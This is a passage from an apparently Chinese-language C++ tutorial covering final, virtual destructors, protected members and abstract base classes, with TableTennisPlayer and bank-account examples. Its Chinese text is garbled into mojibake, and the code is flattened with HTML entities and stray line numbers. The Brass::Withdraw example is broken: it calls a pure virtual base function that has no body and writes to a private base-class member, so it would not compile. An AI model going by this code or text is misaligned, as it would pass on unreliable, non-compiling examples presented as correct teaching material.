func(int) const override; // æ­£ç¡®ï¼æ˜ç¡®è¦†ç›–&#125;; final å…³é”®å­— (C++11): å¦‚æœä¸å¸Œæœ›æŸä¸ªè™šå‡½æ•°åœ¨æ›´æ·±å±‚æ¬¡çš„æ´¾ç”Ÿç±»ä¸­è¢«è¿›ä¸€æ­¥è¦†ç›–ï¼Œå¯ä»¥åœ¨å…¶å£°æ˜ååŠ ä¸Š finalã€‚ä¹Ÿå¯ä»¥å°†æ•´ä¸ªç±»å£°æ˜ä¸º finalï¼Œé˜»æ­¢ä»»ä½•ç±»ä»å®ƒæ´¾ç”Ÿã€‚ 123456789101112131415161718class Base &#123;public: virtual void func() const;&#125;;class Derived : public Base &#123;public: // è¦†ç›– funcï¼Œå¹¶ä¸”ä¸å…è®¸ Derived çš„å­ç±»å†è¦†ç›–å®ƒ virtual void func() const override final;&#125;;class MoreDerived : public Derived &#123;public: // virtual void func() const override; // é”™è¯¯ï¼å› ä¸º Derived::func è¢«æ ‡è®°ä¸º final&#125;;class CannotInherit final : public Base &#123; // è¿™ä¸ªç±»ä¸èƒ½è¢«ç»§æ‰¿ // ...&#125;;// class Problem : public CannotInherit &#123;&#125;; // é”™è¯¯ï¼ æ„é€ å‡½æ•°ä¸èƒ½æ˜¯è™šå‡½æ•°: å¯¹è±¡çš„ç±»å‹åœ¨æ„é€ å®Œæˆä¹‹å‰æ˜¯æœªç¡®å®šçš„ï¼Œå› æ­¤æ„é€ å‡½æ•°æ— æ³•å®ç°åŠ¨æ€è”ç¼–ã€‚ ææ„å‡½æ•°åº”è¯¥æ˜¯è™šå‡½æ•°: å¦‚æœä¸€ä¸ªç±»æ‰“ç®—ä½œä¸ºåŸºç±»ï¼ˆç‰¹åˆ«æ˜¯å¦‚æœå¯èƒ½é€šè¿‡åŸºç±»æŒ‡é’ˆ delete æ´¾ç”Ÿç±»å¯¹è±¡ï¼‰ï¼Œé‚£ä¹ˆå®ƒçš„ææ„å‡½æ•°åº”è¯¥å£°æ˜ä¸ºè™šå‡½æ•° (virtual ~Base();)ã€‚ åŸå› : è€ƒè™‘ Base *p = new Derived; delete p;ã€‚å¦‚æœ ~Base() ä¸æ˜¯è™šå‡½æ•°ï¼Œdelete p; åªä¼šè°ƒç”¨ ~Base()ï¼Œæ´¾ç”Ÿç±» Derived çš„ææ„å‡½æ•° ~Derived() å°†ä¸ä¼šè¢«è°ƒç”¨ï¼Œå¯èƒ½å¯¼è‡´æ´¾ç”Ÿç±»åˆ†é…çš„èµ„æºï¼ˆå¦‚åŠ¨æ€å†…å­˜ï¼‰æ³„æ¼ã€‚å¦‚æœ ~Base() æ˜¯è™šå‡½æ•°ï¼Œdelete p; ä¼šé€šè¿‡åŠ¨æ€è”ç¼–æ­£ç¡®åœ°è°ƒç”¨ ~Derived()ï¼Œç„¶åå†è°ƒç”¨ ~Base()ï¼Œç¡®ä¿æ‰€æœ‰èµ„æºéƒ½è¢«é‡Šæ”¾ã€‚ è§„åˆ™: å¦‚æœç±»ä¸­æœ‰ä»»ä½•è™šå‡½æ•°ï¼Œé€šå¸¸å°±åº”è¯¥æä¾›ä¸€ä¸ªè™šææ„å‡½æ•°ã€‚å³ä½¿åŸºç±»ææ„å‡½æ•°ä»€ä¹ˆä¹Ÿä¸åšï¼Œä¹Ÿåº”å°†å…¶å£°æ˜ä¸º virtualã€‚ å‹å…ƒå‡½æ•°ä¸èƒ½æ˜¯è™šå‡½æ•°: å‹å…ƒå‡½æ•°ä¸æ˜¯ç±»çš„æˆå‘˜å‡½æ•°ï¼Œç»§æ‰¿æœºåˆ¶ä¸é€‚ç”¨äºå®ƒä»¬ã€‚ é™æ€æˆå‘˜å‡½æ•°ä¸èƒ½æ˜¯è™šå‡½æ•°: é™æ€æˆå‘˜å‡½æ•°ä¸ç±»æœ¬èº«å…³è”ï¼Œè€Œä¸æ˜¯ä¸ç‰¹å®šå¯¹è±¡å…³è”ï¼ˆæ²¡æœ‰ this æŒ‡é’ˆï¼‰ï¼Œå› æ­¤åŠ¨æ€è”ç¼–å¯¹å…¶æ²¡æœ‰æ„ä¹‰ã€‚ ç†è§£é™æ€è”ç¼–å’ŒåŠ¨æ€è”ç¼–çš„åŒºåˆ«ï¼Œä»¥åŠä½•æ—¶ã€å¦‚ä½•ä½¿ç”¨è™šå‡½æ•°ï¼Œæ˜¯æŒæ¡ C++ å¤šæ€ç‰¹æ€§å’Œç¼–å†™å¥å£®ã€å¯æ‰©å±•çš„é¢å‘å¯¹è±¡ä»£ç çš„å…³é”®ã€‚ 13.5 è®¿é—®æ§åˆ¶ï¼šprotectedåˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬ä½¿ç”¨äº† public å’Œ private è®¿é—®è¯´æ˜ç¬¦æ¥æ§åˆ¶å¯¹ç±»æˆå‘˜çš„è®¿é—®ã€‚ public æˆå‘˜å¯ä»¥è¢«ä»»ä½•åœ°æ–¹çš„ä»£ç è®¿é—®ã€‚ private æˆå‘˜åªèƒ½è¢«å®šä¹‰å®ƒä»¬çš„ç±»çš„æˆå‘˜å‡½æ•°ï¼ˆä»¥åŠå‹å…ƒï¼‰è®¿é—®ã€‚ åœ¨ç»§æ‰¿çš„èƒŒæ™¯ä¸‹ï¼Œprivate æˆå‘˜æœ‰ä¸€ä¸ªé‡è¦çš„é™åˆ¶ï¼šåŸºç±»çš„ private æˆå‘˜ä¸èƒ½è¢«æ´¾ç”Ÿç±»çš„æˆå‘˜å‡½æ•°ç›´æ¥è®¿é—®ã€‚æ´¾ç”Ÿç±»éœ€è¦é€šè¿‡åŸºç±»çš„ public æˆ– protected æ¥å£ï¼ˆæ–¹æ³•ï¼‰æ¥é—´æ¥ä¸åŸºç±»çš„ç§æœ‰æ•°æ®äº¤äº’ã€‚ C++ æä¾›äº†ç¬¬ä¸‰ä¸ªè®¿é—®è¯´æ˜ç¬¦ï¼š**protected**ã€‚ protected æˆå‘˜çš„è®¿é—®è§„åˆ™: å¯¹äºç±»çš„å¤–éƒ¨ï¼ˆéæˆå‘˜å‡½æ•°ï¼Œéæ´¾ç”Ÿç±»ï¼‰ï¼Œprotected æˆå‘˜çš„è¡Œä¸ºä¸ private æˆå‘˜ç›¸åŒï¼Œå³ä¸å¯è®¿é—®ã€‚ å¯¹äºç±»çš„æˆå‘˜å‡½æ•°ï¼ˆä»¥åŠå‹å…ƒï¼‰ï¼Œprotected æˆå‘˜çš„è¡Œä¸ºä¸ public æˆå‘˜ç›¸åŒï¼Œå³å¯ç›´æ¥è®¿é—®ã€‚ å¯¹äºæ´¾ç”Ÿç±»çš„æˆå‘˜å‡½æ•°ï¼Œprotected æˆå‘˜çš„è¡Œä¸ºä¹Ÿä¸ public æˆå‘˜ç›¸åŒï¼Œå³æ´¾ç”Ÿç±»å¯ä»¥ç›´æ¥è®¿é—®åŸºç±»çš„ protected æˆå‘˜ã€‚ æ€»ç»“è®¿é—®æƒé™: è®¿é—®æ¥æº public æˆå‘˜ protected æˆå‘˜ private æˆå‘˜ ç±»å†…éƒ¨ (æˆå‘˜å‡½æ•°) å¯è®¿é—® å¯è®¿é—® å¯è®¿é—® æ´¾ç”Ÿç±» (æˆå‘˜å‡½æ•°) å¯è®¿é—® å¯è®¿é—® ä¸å¯è®¿é—® ç±»å¤–éƒ¨ (æ™®é€šä»£ç ) å¯è®¿é—® ä¸å¯è®¿é—® ä¸å¯è®¿é—® ç¤ºä¾‹ï¼šä¿®æ”¹ TableTennisPlayer ä½¿ç”¨ protected è®©æˆ‘ä»¬ä¿®æ”¹ TableTennisPlayer ç±»ï¼Œå°† firstname å’Œ lastname è®¾ä¸º protectedï¼Œçœ‹çœ‹ RatedPlayer å¦‚ä½•è®¿é—®å®ƒä»¬ã€‚ tabtenn_prot.h (ä½¿ç”¨ protected çš„ç‰ˆæœ¬) 123456789101112131415161718192021222324252627282930313233343536373839#ifndef TABTENN_PROT_H_#define TABTENN_PROT_H_#include &lt;string&gt;#include &lt;iostream&gt;// åŸºç±» - ä½¿ç”¨ protected æˆå‘˜class TableTennisPlayerProt &#123;// protected æˆå‘˜:protected: // æ”¹ä¸º protected std::string firstname; std::string lastname;private: // hasTable ä»ç„¶æ˜¯ private bool hasTable;public: TableTennisPlayerProt (const std::string &amp; fn = &quot;none&quot;, const std::string &amp; ln = &quot;none&quot;, bool ht = false); // Name() ä¸å†éœ€è¦ï¼Œå› ä¸ºæ´¾ç”Ÿç±»å¯ä»¥ç›´æ¥è®¿é—® protected æˆå‘˜æ¥æ„å»ºè‡ªå·±çš„ Name() // virtual void Name() const; // å¯ä»¥ç§»é™¤æˆ–ä¿ç•™ bool HasTable() const &#123; return hasTable; &#125;; void ResetTable(bool v) &#123; hasTable = v; &#125;; virtual ~TableTennisPlayerProt() &#123; &#125;&#125;;// æ´¾ç”Ÿç±»class RatedPlayerProt : public TableTennisPlayerProt &#123;private: unsigned int rating;public: RatedPlayerProt (unsigned int r = 0, const std::string &amp; fn = &quot;none&quot;, const std::string &amp; ln = &quot;none&quot;, bool ht = false); RatedPlayerProt(unsigned int r, const TableTennisPlayerProt &amp; tp); unsigned int Rating() const &#123; return rating; &#125; void ResetRating (unsigned int r) &#123; rating = r; &#125; // æ´¾ç”Ÿç±»å¯ä»¥ç›´æ¥è®¿é—®åŸºç±»çš„ protected æˆå‘˜ void ShowInfo() const; // æ–°å¢ä¸€ä¸ªæ–¹æ³•æ¥æ¼”ç¤ºè®¿é—®&#125;;#endif // TABTENN_PROT_H_ tabtenn_prot.cpp (å®ç°) 12345678910111213141516171819202122232425262728293031323334#include &quot;tabtenn_prot.h&quot;#include &lt;iostream&gt;// TableTennisPlayerProt æ–¹æ³•TableTennisPlayerProt::TableTennisPlayerProt (const std::string &amp; fn, const std::string &amp; ln, bool ht) : firstname(fn), lastname(ln), hasTable(ht) &#123;&#125;// RatedPlayerProt æ–¹æ³•RatedPlayerProt::RatedPlayerProt(unsigned int r, const std::string &amp; fn, const std::string &amp; ln, bool ht) : TableTennisPlayerProt(fn, ln, ht), rating(r) &#123;&#125;// æ³¨æ„ï¼šè¿™ä¸ªæ„é€ å‡½æ•°ä»ç„¶éœ€è¦è°ƒç”¨åŸºç±»æ„é€ å‡½æ•°ï¼Œ// å› ä¸ºå³ä½¿ firstname/lastname æ˜¯ protectedï¼Œåˆå§‹åŒ–ä¹Ÿåº”ç”±åŸºç±»è´Ÿè´£ã€‚// ä½†å¦‚æœåŸºç±»æ²¡æœ‰æä¾›åˆé€‚çš„æ„é€ å‡½æ•°ï¼Œæ´¾ç”Ÿç±»å¯ä»¥åœ¨å…¶æ„é€ å‡½æ•°ä½“ä¸­// ç›´æ¥ç»™ protected æˆå‘˜èµ‹å€¼ (è™½ç„¶ä¸æ¨è)ã€‚RatedPlayerProt::RatedPlayerProt(unsigned int r, const TableTennisPlayerProt &amp; tp) : TableTennisPlayerProt(tp), rating(r) &#123;&#125;// æ´¾ç”Ÿç±»æ–¹æ³•å¯ä»¥ç›´æ¥è®¿é—®åŸºç±»çš„ protected æˆå‘˜void RatedPlayerProt::ShowInfo() const &#123; // ç›´æ¥è®¿é—®ç»§æ‰¿æ¥çš„ protected æˆå‘˜ firstname å’Œ lastname std::cout &lt;&lt; &quot;Name: &quot; &lt;&lt; lastname &lt;&lt; &quot;, &quot; &lt;&lt; firstname; std::cout &lt;&lt; &quot;; Rating: &quot; &lt;&lt; rating; // ä¸èƒ½ç›´æ¥è®¿é—®åŸºç±»çš„ private æˆå‘˜ hasTable // std::cout &lt;&lt; HasTable(); // éœ€è¦é€šè¿‡åŸºç±»çš„ public æ–¹æ³•è®¿é—® if (HasTable()) std::cout &lt;&lt; &quot;; Has Table: Yes\\n&quot;; else std::cout &lt;&lt; &quot;; Has Table: No\\n&quot;;&#125; ä½¿ç”¨ç¤ºä¾‹ (usett_prot.cpp) 12345678910111213141516171819202122#include &lt;iostream&gt;#include &quot;tabtenn_prot.h&quot;int main ( void ) &#123; using std::cout; using std::endl; RatedPlayerProt rplayer1(1140, &quot;Mallory&quot;, &quot;Duck&quot;, true); TableTennisPlayerProt player1(&quot;Tara&quot;, &quot;Boomdea&quot;, false); // åŸºç±»å¯¹è±¡ cout &lt;&lt; &quot;Rated Player Info:\\n&quot;; rplayer1.ShowInfo(); // è°ƒç”¨æ´¾ç”Ÿç±»æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è®¿é—®äº†åŸºç±»çš„ protected æˆå‘˜ // å¤–éƒ¨ä»£ç ä¸èƒ½ç›´æ¥è®¿é—® protected æˆå‘˜ // cout &lt;&lt; rplayer1.firstname; // é”™è¯¯ï¼firstname æ˜¯ protected // cout &lt;&lt; player1.lastname; // é”™è¯¯ï¼lastname æ˜¯ protected // å¤–éƒ¨ä»£ç å¯ä»¥è®¿é—® public æˆå‘˜ cout &lt;&lt; &quot;\\nPlayer 1 Has Table? &quot; &lt;&lt; player1.HasTable() &lt;&lt; endl; // OK return 0;&#125; ç¼–è¯‘å’Œè¿è¡Œ: 12g++ usett_prot.cpp tabtenn_prot.cpp -o usett_prot./usett_prot è¾“å‡º: 1234Rated Player Info:Name: Duck, Mallory; Rating: 1140; Has Table: YesPlayer 1 Has Table? 0 ä½¿ç”¨ protected çš„åˆ©å¼Š: ä¼˜ç‚¹: ä¸ºæ´¾ç”Ÿç±»æä¾›æ¯” private æ›´å¤§çš„è®¿é—®æƒé™ï¼Œå…è®¸æ´¾ç”Ÿç±»æ›´ç›´æ¥åœ°ä¸åŸºç±»å®ç°äº¤äº’ã€‚ ç›¸æ¯” publicï¼Œä»ç„¶å¯¹å¤–éƒ¨ä¸–ç•Œéšè—äº†å®ç°ç»†èŠ‚ã€‚ ç¼ºç‚¹: ç ´åå°è£…: å°†æˆå‘˜è®¾ä¸º protected è€Œä¸æ˜¯ privateï¼Œæ„å‘³ç€åŸºç±»çš„å®ç°ç»†èŠ‚æš´éœ²ç»™äº†æ‰€æœ‰æ´¾ç”Ÿç±»ã€‚å¦‚æœå°†æ¥ä¿®æ”¹åŸºç±»çš„ protected æˆå‘˜ï¼Œå¯èƒ½ä¼šå½±å“æ‰€æœ‰æ´¾ç”Ÿç±»ï¼Œå¢åŠ äº†ç±»ä¹‹é—´çš„è€¦åˆåº¦ã€‚ ç»´æŠ¤å›°éš¾: éšç€ç»§æ‰¿å±‚æ¬¡çš„åŠ æ·±ï¼Œè¿½è¸ªå“ªäº›ç±»ä¾èµ–äºç‰¹å®šçš„ protected æˆå‘˜ä¼šå˜å¾—å›°éš¾ã€‚ è®¾è®¡å»ºè®®: ä¼˜å…ˆä½¿ç”¨ private æˆå‘˜ï¼Œå¹¶é€šè¿‡ public æˆ– protected æˆå‘˜å‡½æ•°æä¾›å¯¹æ•°æ®çš„è®¿é—®ï¼ˆå¦‚æœéœ€è¦ï¼‰ã€‚è¿™æä¾›äº†æ›´å¥½çš„å°è£…å’Œçµæ´»æ€§ã€‚ åªæœ‰å½“ä½ ç¡®å®šæ´¾ç”Ÿç±»ç¡®å®éœ€è¦ç›´æ¥è®¿é—®åŸºç±»çš„æŸä¸ªå®ç°ç»†èŠ‚ï¼Œå¹¶ä¸”æä¾› public/protected æ¥å£ä¸æ–¹ä¾¿æˆ–æ•ˆç‡ä½ä¸‹æ—¶ï¼Œæ‰è€ƒè™‘ä½¿ç”¨ protected æ•°æ®æˆå‘˜ã€‚ protected æˆå‘˜å‡½æ•°é€šå¸¸æ¯” protected æ•°æ®æˆå‘˜æ›´å—æ¬¢è¿ï¼Œå› ä¸ºå®ƒä»¬æä¾›äº†å—æ§çš„è®¿é—®æ¥å£ï¼Œè€Œä¸æ˜¯ç›´æ¥æš´éœ²æ•°æ®ã€‚ æ€»ä¹‹ï¼Œprotected æä¾›äº†ä¸€ç§ä»‹äº private å’Œ public ä¹‹é—´çš„è®¿é—®æ§åˆ¶çº§åˆ«ï¼Œä¸»è¦ç”¨äºç®¡ç†åŸºç±»å’Œæ´¾ç”Ÿç±»ä¹‹é—´çš„è®¿é—®æƒé™ã€‚ 13.6 æŠ½è±¡åŸºç±»åœ¨è®¾è®¡ç±»å±‚æ¬¡ç»“æ„æ—¶ï¼Œæˆ‘ä»¬æœ‰æ—¶ä¼šé‡åˆ°è¿™æ ·ä¸€ç§æƒ…å†µï¼šåŸºç±»æœ¬èº«ä»£è¡¨çš„æ˜¯ä¸€ä¸ªéå¸¸æŠ½è±¡çš„æ¦‚å¿µï¼Œä»¥è‡³äºåˆ›å»ºè¯¥åŸºç±»çš„å¯¹è±¡æœ¬èº«æ²¡æœ‰æ„ä¹‰ã€‚å®ƒå­˜åœ¨çš„ç›®çš„ä¸»è¦æ˜¯ä¸ºäº†å®šä¹‰ä¸€ä¸ªå…±åŒçš„æ¥å£ï¼Œä¾›æ‰€æœ‰å…·ä½“çš„æ´¾ç”Ÿç±»æ¥å®ç°ã€‚è¿™ç§åªä½œä¸ºæ¥å£è§„èŒƒã€ä¸èƒ½è¢«å®ä¾‹åŒ–çš„åŸºç±»ç§°ä¸º**æŠ½è±¡åŸºç±» (Abstract Base Class, ABC)**ã€‚ ä¾‹å¦‚ï¼Œè€ƒè™‘ä¸€ä¸ªå›¾å½¢åº“ï¼Œå¯èƒ½æœ‰ä¸€ä¸ª Shape åŸºç±»ã€‚ä½†ä»€ä¹ˆæ˜¯â€œå½¢çŠ¶â€æœ¬èº«ï¼Ÿå®ƒå¤ªæŠ½è±¡äº†ã€‚æˆ‘ä»¬å®é™…æ“ä½œçš„æ˜¯å…·ä½“çš„å½¢çŠ¶ï¼Œå¦‚ Circleï¼ˆåœ†ï¼‰ã€Rectangleï¼ˆçŸ©å½¢ï¼‰ã€Triangleï¼ˆä¸‰è§’å½¢ï¼‰ç­‰ã€‚åˆ›å»ºä¸€ä¸ªé€šç”¨çš„ Shape å¯¹è±¡å¯èƒ½æ²¡æœ‰æ„ä¹‰ï¼Œä½†æˆ‘ä»¬å¸Œæœ›æ‰€æœ‰å…·ä½“çš„å½¢çŠ¶ç±»éƒ½æä¾›æŸäº›å…±åŒçš„æ“ä½œï¼Œæ¯”å¦‚è®¡ç®—é¢ç§¯ (Area()) æˆ–ç»˜åˆ¶ (Draw())ã€‚ C++ é€šè¿‡çº¯è™šå‡½æ•° (Pure Virtual Function) æ¥å®ç°æŠ½è±¡åŸºç±»ã€‚ çº¯è™šå‡½æ•° (Pure Virtual Function): çº¯è™šå‡½æ•°æ˜¯ä¸€ç§ç‰¹æ®Šçš„è™šå‡½æ•°ï¼Œå®ƒåœ¨åŸºç±»ä¸­æ²¡æœ‰æä¾›å®ç°ï¼ˆæˆ–è€…è¯´ï¼Œå®ç°è¢«å»¶è¿Ÿåˆ°æ´¾ç”Ÿç±»ï¼‰ã€‚ å®ƒç”¨äºå£°æ˜ä¸€ä¸ªæ¥å£ï¼Œå¼ºåˆ¶æ‰€æœ‰éæŠ½è±¡çš„æ´¾ç”Ÿç±»å¿…é¡»æä¾›è‡ªå·±çš„å®ç°ã€‚ è¯­æ³•: åœ¨è™šå‡½æ•°å£°æ˜çš„æœ«å°¾åŠ ä¸Š = 0ã€‚ 1virtual ReturnType FunctionName(parameters) const = 0; // çº¯è™šå‡½æ•°å£°æ˜ æŠ½è±¡åŸºç±» (ABC) çš„å®šä¹‰: åŒ…å«è‡³å°‘ä¸€ä¸ªçº¯è™šå‡½æ•°çš„ç±»å°±æ˜¯æŠ½è±¡åŸºç±» (ABC)ã€‚ ABC çš„ç‰¹æ€§: ä¸èƒ½å®ä¾‹åŒ–: ä½ ä¸èƒ½åˆ›å»ºæŠ½è±¡åŸºç±»çš„å¯¹è±¡ã€‚ 12// å‡è®¾ Shape æ˜¯ä¸€ä¸ª ABC// Shape myShape; // é”™è¯¯ï¼ä¸èƒ½åˆ›å»º ABC çš„å¯¹è±¡ ç¼–è¯‘å™¨ä¼šé˜»æ­¢ä½ è¿™æ ·åšï¼Œå› ä¸º ABC ä¸­çš„çº¯è™šå‡½æ•°æ²¡æœ‰å®ç°ï¼Œå¯¹è±¡æ˜¯ä¸å®Œæ•´çš„ã€‚ å¯ä»¥ä½œä¸ºæ¥å£: ABC ä¸»è¦ç”¨ä½œå®šä¹‰æ¥å£ã€‚å®ƒè§„å®šäº†æ‰€æœ‰æ´¾ç”Ÿç±»å¿…é¡»å®ç°å“ªäº›æ–¹æ³•ã€‚ å¯ä»¥æœ‰æŒ‡é’ˆå’Œå¼•ç”¨: è™½ç„¶ä¸èƒ½åˆ›å»º ABC çš„å¯¹è±¡ï¼Œä½†ä½ å¯ä»¥å£°æ˜æŒ‡å‘ ABC çš„æŒ‡é’ˆæˆ–å¼•ç”¨ã€‚è¿™äº›æŒ‡é’ˆæˆ–å¼•ç”¨å¯ä»¥æŒ‡å‘æˆ–å¼•ç”¨å…¶å…·ä½“çš„æ´¾ç”Ÿç±»å¯¹è±¡ã€‚è¿™å¯¹äºå®ç°å¤šæ€è‡³å…³é‡è¦ã€‚ 123// å‡è®¾ Circle æ˜¯ä» Shape æ´¾ç”Ÿçš„å…·ä½“ç±»Shape * shapePtr = new Circle(5.0); // OK: åŸºç±»æŒ‡é’ˆæŒ‡å‘æ´¾ç”Ÿç±»å¯¹è±¡Shape &amp; shapeRef = *shapePtr; // OK: åŸºç±»å¼•ç”¨å¼•ç”¨æ´¾ç”Ÿç±»å¯¹è±¡ æ´¾ç”Ÿç±»å¿…é¡»å®ç°çº¯è™šå‡½æ•°: ä»»ä½•ä» ABC æ´¾ç”Ÿçš„ç±»ï¼Œå¦‚æœæ²¡æœ‰ä¸ºç»§æ‰¿æ¥çš„æ‰€æœ‰çº¯è™šå‡½æ•°æä¾›å®ç°ï¼Œé‚£ä¹ˆè¿™ä¸ªæ´¾ç”Ÿç±»ä¹Ÿå°†æˆä¸ºä¸€ä¸ªæŠ½è±¡åŸºç±»ï¼ŒåŒæ ·ä¸èƒ½è¢«å®ä¾‹åŒ–ã€‚åªæœ‰å½“æ´¾ç”Ÿç±»å®ç°äº†æ‰€æœ‰ç»§æ‰¿çš„çº¯è™šå‡½æ•°æ—¶ï¼Œå®ƒæ‰æˆä¸º**å…·ä½“ç±» (Concrete Class)**ï¼Œå¯ä»¥è¢«å®ä¾‹åŒ–ã€‚ 13.6.1 åº”ç”¨ ABC æ¦‚å¿µè®©æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªç®€å•çš„é“¶è¡Œè´¦æˆ· ABC AcctABCã€‚ä¸€ä¸ªé€šç”¨çš„â€œè´¦æˆ·â€å¯èƒ½æ— æ³•ç›´æ¥æ“ä½œï¼Œä½†æ‰€æœ‰å…·ä½“çš„è´¦æˆ·ç±»å‹ï¼ˆå¦‚æ”¯ç¥¨è´¦æˆ·ã€å‚¨è“„è´¦æˆ·ï¼‰éƒ½åº”è¯¥æœ‰æŸ¥è¯¢ä½™é¢ã€å­˜æ¬¾ã€å–æ¬¾ç­‰æ“ä½œã€‚ acctabc.h (ABC å®šä¹‰) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#ifndef ACCTABC_H_#define ACCTABC_H_#include &lt;iostream&gt;#include &lt;string&gt;// æŠ½è±¡åŸºç±» AcctABCclass AcctABC &#123;private: std::string fullName; long acctNum; double balance;protected: // æ”¹ä¸º protected ä»¥ä¾¿æ´¾ç”Ÿç±»è®¿é—® // è¾…åŠ©æ ¼å¼åŒ–å‡½æ•° (protectedï¼Œæ´¾ç”Ÿç±»å¯ç”¨) struct Formatting &#123; std::ios_base::fmtflags flag; std::streamsize pr; &#125;; const std::string &amp; FullName() const &#123; return fullName; &#125; long AcctNum() const &#123; return acctNum; &#125; Formatting SetFormat() const; void Restore(Formatting &amp; f) const;public: // æ„é€ å‡½æ•° (ABC ä¹Ÿå¯ä»¥æœ‰æ„é€ å‡½æ•°) AcctABC(const std::string &amp; s = &quot;Nullbody&quot;, long an = -1, double bal = 0.0); // å­˜æ¬¾ void Deposit(double amt); // å–æ¬¾ - è®¾ä¸ºçº¯è™šå‡½æ•°ï¼Œå…·ä½“å®ç°åœ¨æ´¾ç”Ÿç±» virtual void Withdraw(double amt) = 0; // æŸ¥è¯¢ä½™é¢ double Balance() const &#123; return balance; &#125; // æŸ¥çœ‹è´¦æˆ·ä¿¡æ¯ - è®¾ä¸ºçº¯è™šå‡½æ•° virtual void ViewAcct() const = 0; // è™šææ„å‡½æ•° (åŸºç±»æœ‰è™šå‡½æ•°ï¼Œææ„å‡½æ•°ä¹Ÿåº”æ˜¯è™šçš„) virtual ~AcctABC() &#123;&#125;&#125;;// å…·ä½“çš„æ´¾ç”Ÿç±»: Brass Account (æ”¯ç¥¨è´¦æˆ·)class Brass : public AcctABC &#123;public: Brass(const std::string &amp; s = &quot;Nullbody&quot;, long an = -1, double bal = 0.0) : AcctABC(s, an, bal) &#123;&#125; // å®ç°åŸºç±»çš„çº¯è™šå‡½æ•° Withdraw virtual void Withdraw(double amt) override; // å®ç°åŸºç±»çš„çº¯è™šå‡½æ•° ViewAcct virtual void ViewAcct() const override; // Brass ç±»æ²¡æœ‰æ–°çš„çº¯è™šå‡½æ•°ï¼Œæ‰€ä»¥æ˜¯å…·ä½“ç±» virtual ~Brass() &#123;&#125;&#125;;// å…·ä½“çš„æ´¾ç”Ÿç±»: BrassPlus Account (å¸¦é€æ”¯ä¿æŠ¤çš„æ”¯ç¥¨è´¦æˆ·)class BrassPlus : public AcctABC &#123;private: double maxLoan; // æœ€å¤§é€æ”¯é¢ double rate; // é€æ”¯åˆ©ç‡ double owesBank; // å½“å‰æ¬ æ¬¾public: BrassPlus(const std::string &amp; s = &quot;Nullbody&quot;, long an = -1, double bal = 0.0, double ml = 500, double r = 0.11125); BrassPlus(const Brass &amp; ba, double ml = 500, double r = 0.11125); // å®ç°åŸºç±»çš„çº¯è™šå‡½æ•° Withdraw virtual void Withdraw(double amt) override; // å®ç°åŸºç±»çš„çº¯è™šå‡½æ•° ViewAcct virtual void ViewAcct() const override; // æ´¾ç”Ÿç±»è‡ªå·±çš„æ–¹æ³• void ResetMax(double m) &#123; maxLoan = m; &#125; void ResetRate(double r) &#123; rate = r; &#125;; void ResetOwes() &#123; owesBank = 0; &#125; virtual ~BrassPlus() &#123;&#125;&#125;;#endif // ACCTABC_H_ acctabc.cpp (å®ç°) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124#include &lt;iostream&gt;#include &quot;acctabc.h&quot;using std::cout;using std::ios_base;using std::endl;using std::string;// --- AcctABC æ–¹æ³•å®ç° ---// æ„é€ å‡½æ•°AcctABC::AcctABC(const string &amp; s, long an, double bal) &#123; fullName = s; acctNum = an; balance = bal;&#125;// å­˜æ¬¾ (éè™šå‡½æ•°ï¼Œæ‰€æœ‰è´¦æˆ·ç±»å‹é€šç”¨)void AcctABC::Deposit(double amt) &#123; if (amt &lt; 0) cout &lt;&lt; &quot;Negative deposit not allowed; &quot; &lt;&lt; &quot;deposit is cancelled.\\n&quot;; else balance += amt;&#125;// æ³¨æ„ï¼šçº¯è™šå‡½æ•° Withdraw() å’Œ ViewAcct() åœ¨åŸºç±»ä¸­æ²¡æœ‰å®ç°ä½“// è¾…åŠ©æ ¼å¼åŒ–å‡½æ•°AcctABC::Formatting AcctABC::SetFormat() const &#123; Formatting f; f.flag = cout.setf(ios_base::fixed, ios_base::floatfield); // use fixed-point f.pr = cout.precision(2); // for $$$.cc format return f;&#125;void AcctABC::Restore(Formatting &amp; f) const &#123; cout.setf(f.flag, ios_base::floatfield); cout.precision(f.pr);&#125;// --- Brass æ–¹æ³•å®ç° ---// å®ç°çº¯è™šå‡½æ•° Withdrawvoid Brass::Withdraw(double amt) &#123; if (amt &lt; 0) &#123; cout &lt;&lt; &quot;Withdrawal amount must be positive; &quot; &lt;&lt; &quot;withdrawal canceled.\\n&quot;; &#125; else if (amt &lt;= Balance()) &#123; // ä½¿ç”¨åŸºç±»çš„ Balance() æ–¹æ³• AcctABC::Withdraw(amt); // è°ƒç”¨åŸºç±»ç‰ˆæœ¬æ¥æ›´æ–°ä½™é¢ (å¦‚æœåŸºç±»æœ‰å®ç°çš„è¯ï¼Œè¿™é‡Œå‡è®¾åŸºç±»æ²¡å®ç°ï¼Œç›´æ¥ä¿®æ”¹) balance -= amt; &#125; else &#123; cout &lt;&lt; &quot;Withdrawal amount of $&quot; &lt;&lt; amt &lt;&lt; &quot; exceeds your balance.\\n&quot; &lt;&lt; &quot;Withdrawal canceled.\\n&quot;; &#125;&#125;// å®ç°çº¯è™šå‡½æ•° ViewAcctvoid Brass::ViewAcct() const &#123; Formatting f = SetFormat(); // ä½¿ç”¨åŸºç±»çš„æ ¼å¼åŒ–è¾…åŠ©å‡½æ•° cout &lt;&lt; &quot;Brass Client: &quot; &lt;&lt; FullName() &lt;&lt; endl; // ä½¿ç”¨åŸºç±»çš„ protected æ–¹æ³• cout &lt;&lt; &quot;Account Number: &quot; &lt;&lt; AcctNum() &lt;&lt; endl; // ä½¿ç”¨åŸºç±»çš„ protected æ–¹æ³• cout &lt;&lt; &quot;Balance: $&quot; &lt;&lt; Balance() &lt;&lt; endl; // ä½¿ç”¨åŸºç±»çš„ public æ–¹æ³• Restore(f); // æ¢å¤æ ¼å¼&#125;// --- BrassPlus æ–¹æ³•å®ç° ---BrassPlus::BrassPlus(const string &amp; s, long an, double bal, double ml, double r) : AcctABC(s, an, bal) &#123; maxLoan = ml; owesBank = 0.0; rate = r;&#125;BrassPlus::BrassPlus(const Brass &amp; ba, double ml, double r) : AcctABC(ba) &#123; // ä½¿ç”¨ AcctABC çš„éšå¼å¤åˆ¶æ„é€ å‡½æ•° (å¦‚æœå­˜åœ¨ä¸”å¯ç”¨) // 